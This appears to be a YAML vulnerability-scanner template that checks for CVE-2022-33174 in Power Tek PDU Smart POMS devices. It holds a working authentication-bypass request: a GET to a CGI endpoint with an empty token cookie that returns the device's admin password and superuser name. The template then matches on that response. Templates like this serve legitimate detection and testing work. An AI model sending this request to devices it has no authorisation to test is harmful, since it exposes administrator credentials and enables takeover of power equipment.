name: yaml-poc-powertekpdus-smart_poms-other-CVE-2022-33174
binding: c673526a-5985-4a62-b527-0c0789e11f00
detail:
    author: jiapeng.han
    links:
        - https://cxsecurity.com/cveshow/CVE-2022-33174/
        - https://gynvael.coldwind.pl/?lang=en&id=748
        - https://nvd.nist.gov/vuln/detail/CVE-2022-33174
    vulnerability:
        id: 6f1b14d2-fbd7-4d4e-aefc-2d21c9fa3021
        level: high
    warning: Harmless
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /cgi/get_param.cgi?xml&sys.passwd&sys.su.name
            headers:
                Cookie: tmpToken=;
            follow_redirects: false
        expression: response.status == 200 && (response.body_string.contains("<sys.passwd>") || response.body_string.contains("<sys.su.name>")) && response.content_type.contains("text/xml")
expression: r0()
